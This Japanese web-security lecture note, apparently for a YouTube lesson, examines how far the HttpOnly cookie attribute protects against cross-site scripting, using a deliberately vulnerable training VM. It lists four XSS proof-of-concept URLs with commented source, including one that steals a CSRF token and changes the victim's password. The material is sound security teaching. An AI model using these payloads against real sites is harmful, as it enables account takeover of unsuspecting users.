# CookieのHttpOnly属性でどこまで安全になるのか

- 本日お伝えしたいこと
  - CookieのHttpOnly属性について説明します
  - CookieのHttpOnly属性でクロスサイトスクリプティング攻撃がどの程度安全になるかを説明します
- 前提となる環境
  - 徳丸本VM(Bad Todo List)

# PoC

```
# XSS1 (Cookieの表示)
http://example.jp/todo/todolist.php?key="><script>alert(document.cookie)</script>


# XSS2 (HTMLの表示)
http://example.jp/todo/todolist.php?key="><script>alert(document.documentElement.innerHTML)</script>


# XSS3 (XHRによるマイページ表示)
http://example.jp/todo/todolist.php?key="><script>$.ajax({url:"mypage.php"}).done(function(d){alert(d)})</script>


# XSS4 (パスワード変更)
http://example.jp/todo/todolist.php?key="><script>$.ajax({url:"changepwd.php"}).done(function(d){console.log(d);token%3dd.match("[0-9a-f]{48}")[0];console.log(token);$.ajax({type:"POST",url:"changepwddo.php",data:{newpwd:"a",newpwd2:"a",id:1,todotoken:token}})})</script>
```

参考ソースコード
```
// XSS1 (Cookieの表示)
alert(document.cooki)

// XSS2 (HTMLの表示)
script>alert(document.documentElement.innerHTML)

// XSS3 (XHRによるマイページ表示)
$.ajax({
  url: "mypage.php"
}).done(function(d) {
  alert(d)
}) // jQueryを使っているのはBad Todo ListでjQueryを使っているため


// XSS4 (パスワード変更)
$.ajax({
  url: "changepwd.php" // パスワード変更フォームをリクエスト
}).done(function(d) {
  token = d.match("[0-9a-f]{48}")[0]; // 正規表現によりトークン取得
  $.ajax({     
    type: "POST",
    url:"changepwddo.php", // パスワード変更
    data: {newpwd:"a", newpwd2:"a", id:1, todotoken:token}
  }) // ↑ パスワードを「a」に変更
})
```

動画URL : [CookieのHttpOnly属性でどこまで安全になるのか]()

YouTubeチャンネル　[徳丸浩のウェブセキュリティ講座](https://www.youtube.com/channel/UCLNW6Bo_YU3TxnzsII2gEDA)
